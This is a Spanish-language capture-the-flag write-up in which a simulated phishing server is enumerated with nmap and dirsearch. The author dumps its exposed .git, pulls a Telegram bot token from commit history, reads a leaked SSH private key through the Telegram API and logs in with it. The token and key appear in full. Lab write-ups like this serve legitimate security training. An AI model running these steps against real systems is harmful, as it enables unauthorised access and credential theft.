
# Capture the Flag - Talent Arena 2026

<figure><img src="/files/M47reGkjCkVKDVrvhgz9" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Introducción - Flag 1</mark>

### Active Phishing Campaign — "SpainPost Express"

#### 1. SITUATION

An organized fraud ring is operating a large-scale SMS phishing campaign targeting mobile users across Europe. Victims receive fraudulent text messages impersonating a postal delivery service. The messages direct victims to a payment portal that harvests financial credentials.

Law enforcement has intercepted the following SMS sample from a compromised device:

{% code overflow="wrap" %}

```
FROM: +34 612 XX XX XX

SpainPost Express: Your package SP-2026-MWC-48291 is held at customs. Pay the pending customs fee (€2.99) at: http://18.134.133.147
```

{% endcode %}

#### 2. YOUR MISSION

You are part of a cybersecurity task force assigned to dismantle this operation. Your objectives:

* Investigate the phishing infrastructure
* Identify the threat actors and their tools
* Gain access to their operational server
* Collect evidence of their criminal activity

There are 5 flags hidden throughout the investigation. Each flag follows the format:

{% code overflow="wrap" %}

```
MWC{...}
```

{% endcode %}

#### 3. RULES OF ENGAGEMENT

Only the target URL provided above is in scope Your assigned target instance IP will be provided via mail No attacks against CTF infrastructure, other teams, or external systems All standard tools and techniques are permitted Internet access is available for tool downloads and research

#### 4. EVIDENCE COLLECTION

Submit each flag to the CTF scoreboard as you find it.&#x20;

#### 5. OPERATIONAL NOTES

```
Think like an attacker: follow the money, follow the data
```

GOOD LUCK. THE CLOCK IS TICKING.

— Cyber Crimes Unit, Talent Arena 2026

***

## <mark style="color:purple;">Enumeración</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "18.134.133.147" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
nmap -p- 18.134.133.147 --min-rate=1000

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 01:21 CST
Nmap scan report for ec2-18-134-133-147.eu-west-2.compute.amazonaws.com (18.134.133.147)
Host is up (0.0011s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Encontramos puertos comunes (22 y 80) abiertos, y el dominio vinculado de AWS, que también añadiremos al /etc/hosts. Nos centraremos en el servicio web.

{% code overflow="wrap" %}

```
ec2-18-134-133-147.eu-west-2.compute.amazonaws.com
```

{% endcode %}

### Acceso Web

Accedemos a la web y observamos que es una web de phising para robar datos bancarios de los usuarios que acceden a esta web.

<figure><img src="/files/a5niqMT23hZi8jxxcKRx" alt=""><figcaption></figcaption></figure>

La única funcionalidad de la web es trackear un número de seguimiento (que está bloqueado porque dicen que faltan de pagar unas tasas) y abajo del todo nos encontramos el botón para acceder a la página de pago `/payment.html`

<figure><img src="/files/zEFU4BMOyYqm6lF9vlWq" alt=""><figcaption></figcaption></figure>

### Prueba de envío de datos

Probaremos a enviar datos fake para ver cómo se comporta la web e intentar descubrir cómo funciona internamente:

<figure><img src="/files/irxH9TmFEaJZgZHAKaoz" alt=""><figcaption></figcaption></figure>

Al capturar la petición con BurpSuite vemos que los datos se envían en formato JSON y nos devuelve el número de tracking original y el status igualmente en formato JSON.

<figure><img src="/files/8cD9Dn1WSO2veh1nFCZZ" alt=""><figcaption></figcaption></figure>

Al hacer el Forward vemos que la petición se envía correctamente.

<figure><img src="/files/I29VBPSjhInLOkwjyV1R" alt=""><figcaption></figcaption></figure>

Podríamos probar alguna técnica para manipular la petición con BurpSuite pero antes vamos a enumerar más la web

***

### Fuzzing de Directorios

```bash
dirsearch -u http://18.134.133.147 -x 404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_18.134.133.147/_26-03-04_23-14-13.txt

Target: http://18.134.133.147/

[23:14:13] Starting: 
[23:14:14] 301 -  178B  - /js  ->  http://18.134.133.147/js/
[23:14:15] 403 -  564B  - /.c9/metadata/environment/.env
[23:14:16] 403 -  564B  - /.docker/.env
[23:14:16] 403 -  564B  - /.docker/laravel/app/.env
[23:14:16] 403 -  564B  - /.env-example
[23:14:16] 403 -  564B  - /.env.backup
[23:14:16] 403 -  564B  - /.env-sample
[23:14:16] 403 -  564B  - /.env.dev.local
[23:14:16] 403 -  564B  - /.env
[23:14:16] 403 -  564B  - /.env.development.local
[23:14:16] 403 -  564B  - /.env.development.sample
[23:14:16] 403 -  564B  - /.env.dev
[23:14:16] 403 -  564B  - /.env.docker.dev
[23:14:16] 403 -  564B  - /.env.local
[23:14:16] 403 -  564B  - /.env.dist
[23:14:16] 403 -  564B  - /.env.example
[23:14:16] 403 -  564B  - /.env.docker
[23:14:16] 403 -  564B  - /.env.php
[23:14:16] 403 -  564B  - /.env.prod
[23:14:16] 403 -  564B  - /.env.prod.local
[23:14:16] 403 -  564B  - /.env.production
[23:14:16] 403 -  564B  - /.env.production.local
[23:14:16] 403 -  564B  - /.env.sample
[23:14:16] 403 -  564B  - /.env.sample.php
[23:14:16] 403 -  564B  - /.env.save
[23:14:16] 403 -  564B  - /.env.stage
[23:14:16] 403 -  564B  - /.env.test
[23:14:16] 403 -  564B  - /.env.test.local
[23:14:16] 403 -  564B  - /.env.test.sample
[23:14:16] 403 -  564B  - /.env.travis
[23:14:16] 403 -  564B  - /.environment
[23:14:16] 403 -  564B  - /.envrc
[23:14:16] 403 -  564B  - /.env~
[23:14:16] 403 -  564B  - /.envs
[23:14:17] 301 -  178B  - /.git  ->  http://18.134.133.147/.git/
[23:14:17] 403 -  564B  - /.git/
[23:14:17] 403 -  564B  - /.git/branches/
[23:14:17] 200 -   52B  - /.git/COMMIT_EDITMSG
[23:14:17] 200 -   73B  - /.git/description
[23:14:17] 200 -  136B  - /.git/config
[23:14:17] 200 -   23B  - /.git/HEAD
[23:14:17] 403 -  564B  - /.git/hooks/
[23:14:17] 200 -  989B  - /.git/index
[23:14:17] 403 -  564B  - /.git/info/
[23:14:17] 200 -  240B  - /.git/info/exclude
[23:14:17] 200 -  554B  - /.git/logs/HEAD
[23:14:17] 301 -  178B  - /.git/logs/refs  ->  http://18.134.133.147/.git/logs/refs/
[23:14:17] 403 -  564B  - /.git/logs/
[23:14:17] 301 -  178B  - /.git/logs/refs/heads  ->  http://18.134.133.147/.git/logs/refs/heads/
[23:14:17] 200 -  554B  - /.git/logs/refs/heads/master
[23:14:17] 403 -  564B  - /.git/objects/
[23:14:17] 301 -  178B  - /.git/refs/heads  ->  http://18.134.133.147/.git/refs/heads/
[23:14:17] 200 -   41B  - /.git/refs/heads/master
[23:14:17] 403 -  564B  - /.git/refs/
[23:14:17] 301 -  178B  - /.git/refs/tags  ->  http://18.134.133.147/.git/refs/tags/
[23:14:17] 200 -   23B  - /.gitignore
[23:14:18] 403 -  564B  - /.htaccess.bak1
[23:14:18] 403 -  564B  - /.htaccess.save
[23:14:18] 403 -  564B  - /.htaccess.sample
[23:14:18] 403 -  564B  - /.htaccess.orig
[23:14:18] 403 -  564B  - /.htaccessOLD
[23:14:18] 403 -  564B  - /.htaccessBAK
[23:14:18] 403 -  564B  - /.htaccessOLD2
[23:14:18] 403 -  564B  - /.htaccess_extra
[23:14:18] 403 -  564B  - /.htaccess_orig
[23:14:18] 403 -  564B  - /.htaccess_sc
[23:14:18] 403 -  564B  - /.htpasswds
[23:14:18] 403 -  564B  - /.htpasswd_test
[23:14:22] 403 -  564B  - /.vscode/.env
[23:14:38] 301 -  178B  - /api  ->  http://18.134.133.147/api/
[23:14:40] 403 -  564B  - /backend/
[23:14:52] 301 -  178B  - /css  ->  http://18.134.133.147/css/
[23:15:03] 301 -  178B  - /img  ->  http://18.134.133.147/img/
[23:15:06] 403 -  564B  - /js/
[23:15:12] 403 -  564B  - /mailer/.env
[23:15:20] 200 -    5KB - /payment.html
[23:15:39] 403 -  564B  - /twitter/.env

Task Completed
```

Encontramos un GIT expuesto, por lo que procederemos a dumpearlo en local.

### Git Dumper

```bash
git-dumper http://18.134.133.147/.git/ /home/kali/Escritorio/machines/CTF
```

La estructura de archivos es la siguiente:

{% code overflow="wrap" %}

```
tree .
.
├── backend
│   ├── app.py
│   ├── bot.py
│   ├── notifier.py
│   └── requirements.txt
├── css
│   └── style.css
├── img
│   └── logo.png
├── index.html
├── js
│   └── app.js
└── payment.html

5 directories, 9 files
```

{% endcode %}

### Credential Hunting

En la siguiente ruta encontramos un archivo llamado `master` que contiene usuarios y 3 commits de GitHub:

{% code overflow="wrap" %}

```
/CTF/.git/logs/refs/heads
```

{% endcode %}

```bash
cat master       
           
0000000000000000000000000000000000000000 2035777764bb86f5fe818c571beb3a610a21815e darkfish92 <darkfish92@proton.me> 1772627303 +0000	commit (initial): initial site setup
2035777764bb86f5fe818c571beb3a610a21815e 4c74da7aca961c38237f6a49aec2f3ddfc2a67af xxpanteraxx <pantera_dev@cock.li> 1772627303 +0000	commit: add payment processing and telegram notifications
4c74da7aca961c38237f6a49aec2f3ddfc2a67af b7617ce745dcb842a664e96378a0800d18d3fcc8 darkfish92 <darkfish92@proton.me> 1772627303 +0000	commit: security: move credentials to environment variables
```

Tenemos 2 usuarios y 3 commits.

### Análisis de commits

#### Info del último commit

{% code overflow="wrap" %}

```bash
git cat-file -p 4c74da7aca961c38237f6a49aec2f3ddfc2a67af

tree d32ffbff68e2ad17c86728f980d259b1b1fc7fd6
parent 2035777764bb86f5fe818c571beb3a610a21815e
author xxpanteraxx <pantera_dev@cock.li> 1768466700 +0100
committer xxpanteraxx <pantera_dev@cock.li> 1772627303 +0000

add payment processing and telegram notifications
```

{% endcode %}

### Análisis de los archivos

#### bot.py

{% code overflow="wrap" %}

```bash
git show 4c74da7aca961c38237f6a49aec2f3ddfc2a67af:backend/bot.py
```

{% endcode %}

{% code overflow="wrap" %}

```python
import telebot
import sqlite3
import threading

BOT_TOKEN = "8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I"

bot = telebot.TeleBot(BOT_TOKEN)

SNIP
```

{% endcode %}

Bingo! Obtenemos el BOT\_TOKEN

#### notifyer.py

{% code overflow="wrap" %}

```bash
git show 4c74da7aca961c38237f6a49aec2f3ddfc2a67af:backend/notifier.py

import requests

BOT_TOKEN = "8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I"
CHAT_ID = "-5118994856"

def send_notification(victim_data):
    message = format_victim_message(victim_data)
    send_telegram(CHAT_ID, message)

    from bot import get_listeners
    for listener_id in get_listeners():
        try:
            send_telegram(listener_id, message)
        except Exception:
            pass

def send_telegram(chat_id, text):
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

def format_victim_message(data):
    return f"""🎣 <b>New catch!</b>

Name: {data.get('name', 'N/A')}
Email: {data.get('email', 'N/A')}
Card: {data.get('card', '****')[:4]}****{data.get('card', '****')[-4:]}
Expiry: {data.get('expiry', 'N/A')}
CVV: {data.get('cvv', 'N/A')}
Amount: €{data.get('amount', '2.99')}
```

{% endcode %}

Hemos obtenido:

{% code overflow="wrap" %}

```bash
BOT_TOKEN = "8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I"
CHAT_ID = "-5118994856"
```

{% endcode %}

### Testeo del bot

{% code overflow="wrap" %}

```bash
curl -s "https://api.telegram.org/bot8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I/getUpdates"

{"ok":true,"result":[]}
```

{% endcode %}

Al hacer el curl nos devuelve true, lo que nos indica que el bot está activo y es accesible, por lo que lo buscamos en telegram y efectivamente existe:

<figure><img src="/files/OeAIF2liHkzvHEnpw7cp" alt=""><figcaption></figcaption></figure>

En la URL vemos el ID del bot, que efectivamente coindice con el inicio del BOT\_TOKEN:

{% code overflow="wrap" %}

```
https://web.telegram.org/a/#8258655592
```

{% endcode %}

#### Obtener info del bot

```json
curl -s "https://api.telegram.org/bot8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I/getMe" | jq .
{
  "ok": true,
  "result": {
    "id": 8258655592,
    "is_bot": true,
    "first_name": "SpainPost Express",
    "username": "spainpost_express_bot",
    "can_join_groups": true,
    "can_read_all_group_messages": true,
    "supports_inline_queries": false,
    "can_connect_to_business": false,
    "has_main_web_app": false,
    "has_topics_enabled": false,
    "allows_users_to_create_topics": false
  }
}
```

El resultado del comando es correcto: `"result": []` significa que no hay actualizaciones pendientes para el bot. Esto indica que hasta ahora nadie ha interactuado con él (no se han enviado mensajes de notificación) o que ya se han leído y borrado.

Ahora podemos provocar nosotros mismos que el bot envíe un mensaje.

Basándonos en el código actual de `notifier.py` (que vimos en el commit, aunque ahora use variables de entorno), el mensaje se construye así:

```python
def format_victim_message(data):
    return f"""🎣 <b>New catch!</b>

Name: {data.get('name', 'N/A')}
Email: {data.get('email', 'N/A')}
Card: {data.get('card', '****')[:4]}****{data.get('card', '****')[-4:]}
Expiry: {data.get('expiry', 'N/A')}
CVV: {data.get('cvv', 'N/A')}
Amount: €{data.get('amount', '2.99')}
"""
```

El campo `name` se inserta directamente en el mensaje. Si logramos que `name` sea el resultado de leer un archivo, ese contenido viajará al chat del atacante. **Nosotros no vemos ese chat, pero podemos leerlo usando el token del bot**, como ya intentamos con `getUpdates`.

***

## <mark style="color:purple;">**Explotación**</mark>

Al hacer la siguiente llamada:

{% code overflow="wrap" %}

```bash
curl -s "https://api.telegram.org/bot8258655592:AAFDAxPUk7xm5vMNzfM9o6iT2CCQ0cSHS2I/getUpdates" | jq '.result[] | select(.message.chat.id == -5118994856) | {date: .message.date, from: .message.from.username, text: .message.text}'
```

{% endcode %}

Recibimos una clave SSH en el Bot de Telegram:

<figure><img src="/files/5fzXCYjTBiWro5iqpO1r" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}

```bash
─── ops access ───
host: PLACEHOLDER
user: operator
key:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCL0fpYnSqQ4CcF7b6/Ocy78//4B5ZPQ579h1TDzHW7fgAAAJiNbkT6jW5E
+gAAAAtzc2gtZWQyNTUxOQAAACCL0fpYnSqQ4CcF7b6/Ocy78//4B5ZPQ579h1TDzHW7fg
AAAEB2NhP3+a4gU/MwFgiFvRFu1dzgCi5yOwYWPtx250muZovR+lidKpDgJwXtvr85zLvz
//gHlk9Dnv2HVMPMdbt+AAAAEm9wZXJhdG9yQHNwYWlucG9zdAECAw==
-----END OPENSSH PRIVATE KEY-----
```

{% endcode %}

Guardamos la key e intentamos acceder:

{% code overflow="wrap" %}

```bash
ssh operator@18.134.133.147 -i ssh.key

The authenticity of host '18.134.133.147 (18.134.133.147)' can't be established.
ED25519 key fingerprint is SHA256:GAXXv9VFfjDpMzPLDnOirxBQZnBGgfr8ZsT4Co6U1ww.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '18.134.133.147' (ED25519) to the list of known hosts.
operator@18.134.133.147: Permission denied (publickey).
```

{% endcode %}

`ssh2john` nos confirma lo que sospechábamos: **la clave no tiene passphrase**. El problema es otro: **el usuario `operator` no existe en el servidor** o **su clave pública no está autorizada**.

#### **Análisis del error SSH**

El error:

```
Permission denied (publickey)
```

Nos indica que:

* La clave privada es válida
* El servidor acepta autenticación por clave pública
* Pero la clave pública correspondiente **no está autorizada para el usuario `operator`**

En los commits vimos dos usuarios relevantes:

* `darkfish92`
* `xxpanteraxx`

Y en el log de Git aparece repetidamente `darkfish92@proton.me`.

Es muy probable que el usuario real del sistema coincida con el alias del desarrollador.

### Acceso SSH

Probamos con el usuario descubierto en Git:

```bash
ssh darkfish92@18.134.133.147 -i ssh.key
```

Y esta vez:

```bash
Welcome to Ubuntu 22.04 LTS
darkfish92@18.134.133.147:~$
```

💥 **Acceso concedido y leemos la flag 1!**
